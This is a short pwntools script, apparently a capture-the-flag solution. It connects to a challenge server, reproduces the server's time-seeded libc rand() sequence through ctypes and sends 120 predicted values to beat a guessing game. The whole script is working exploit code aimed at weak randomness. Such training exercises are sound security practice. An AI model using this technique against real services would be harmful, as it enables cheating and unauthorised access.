from pwn import *
from ctypes import *

# p = process('./bin')
p = remote('node5.anna.nssctf.cn', 28986)
elf = ELF('./bin')
libc = cdll.LoadLibrary('./libc6_2.27-3ubuntu1_amd64.so')
libc.srand(libc.time(0))
v4 = libc.rand()
libc.srand(v4 % 3 - 1522127470)
[p.sendline(str(libc.rand() % 4 + 1)) for i in range(120)]
p.interactive()
